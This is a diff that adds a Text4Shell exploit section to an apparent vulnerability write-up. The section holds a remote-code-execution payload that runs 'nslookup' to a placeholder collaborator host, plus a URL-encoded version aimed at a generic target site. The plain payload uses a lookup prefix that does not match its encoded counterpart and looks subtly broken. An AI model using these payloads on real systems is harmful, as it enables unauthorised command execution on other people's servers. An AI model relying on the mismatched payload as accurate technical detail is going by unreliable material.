@@ -13,3 +13,14 @@ Text4Shell is a critical vulnerability that affects a wide range of systems. The
 
 ### Steps to exploit 
 
+>exploit payload
+
+```java
+#normal payload
+
+${url:UTF-8:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}
+
+#url encoded
+https://your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7d
+```
+
